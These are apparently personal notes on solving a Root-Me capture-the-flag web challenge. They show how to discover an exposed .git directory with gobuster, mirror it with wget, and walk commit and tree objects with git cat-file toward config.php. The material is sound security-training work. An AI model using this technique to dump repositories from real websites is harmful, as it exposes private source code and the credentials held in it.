# Insecure Code Management(git cat-file)

I can find this with gobuster dir --url () --wordlist () option http://challenge01.root-me.org/web-serveur/ch61/.git/

then wget -mk -nH http://challenge01.root-me.org/web-serveur/ch61/.git/ -m: mirror -k: convert links -nH: no Host directory

but above method misses many files and directories thus

wget -r http://challenge01.root-me.org/web-serveur/ch61/.git/

then

ls -lart

└─$ cd .git

┌──(none㉿none)-\[\~/…/challenge01.root-me.org/web-serveur/ch61/.git] └─$ ls branches COMMIT\_EDITMSG config description HEAD hooks index index.html info logs objects refs

┌──(none㉿none)-\[\~/…/challenge01.root-me.org/web-serveur/ch61/.git] └─$ cat HEAD\
ref: refs/heads/master

┌──(none㉿none)-\[\~/…/challenge01.root-me.org/web-serveur/ch61/.git] └─$ cat refs/heads/master c0b4661c888bd1ca0f12a3c080e4d2597382277b

└─$ git log

└─$ **git cat-file** -t c0b4661c888bd1ca0f12a3c080e4d2597382277b

\-t: type

└─$ git cat-file -p c0b4661c888bd1ca0f12a3c080e4d2597382277b tree 94650eae3cb2615762a29ec073c53198adffd3c2 parent 550880c40814a9d0c39ad3485f7620b1dbce0de8 author John [john@bs-corp.com](mailto:john@bs-corp.com) 1569607805 +0200 committer Arod [arod@bs-security.fr](mailto:arod@bs-security.fr) 1569607805 +0200

blue team want sha256!!!!!!!!!

\-p: pretty print

└─$ git cat-file -p 94650eae3cb2615762a29ec073c53198adffd3c2 100644 blob 663fe35facfd983a948d221c769438f230eb18ef config.php 040000 tree 108b6a4cc9c9e653f2b81bb442950eec3d6f9d0c css 040000 tree ab24417f55f5dc5dc5c57d91f4a733740fdc2cac image 100755 blob 2e620c143ab6557a8dacb6a0c284d28c718d6a38 index.php

**tree shows the files at that commit point**

└─$ git cat-file -p 2e620c143ab6557a8dacb6a0c284d28c718d6a38

└─$ git cat-file -p 663fe35facfd983a948d221c769438f230eb18ef
